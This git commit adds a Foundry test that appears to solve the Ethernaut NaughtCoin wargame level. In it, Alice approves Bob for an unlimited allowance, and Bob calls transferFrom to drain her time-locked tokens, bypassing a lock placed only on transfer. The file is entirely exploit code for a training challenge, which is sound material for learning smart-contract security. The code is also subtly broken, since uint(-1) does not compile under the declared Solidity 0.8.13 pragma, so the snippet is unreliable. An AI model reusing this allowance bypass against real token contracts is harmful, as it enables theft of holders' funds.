d02035a36bc0d0ab389ba2724866f8d7ab814a1f
Viktor Lavrenenko <lavrenenkoviktoren@gmail.com>
2022-08-27 18:46:54 +0300

    Hacking the NaughtCoin contract

---
+++ test/NaughtCoin.t.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import "src/NaughtCoin.sol";
+
+contract NaughtCoinTest is Test {
+    NaughtCoin private ncoin;
+    address private constant ALICE = address(0x1);
+    address private constant BOB = address(0x3);
+
+    function setUp() external {
+        vm.deal(ALICE, 10e18);
+        vm.deal(BOB, 1e18);
+        vm.startPrank(ALICE);
+        ncoin = new NaughtCoin(ALICE);
+    }
+
+    function testHack() external {
+        ncoin.approve(BOB, uint(-1));
+        vm.stopPrank();
+
+        vm.startPrank(BOB);
+        uint balance = ncoin.balanceOf(ALICE);
+        ncoin.transferFrom(ALICE, BOB, balance);
+        assertEq(ncoin.balanceOf(ALICE), 0);
+    }
+}
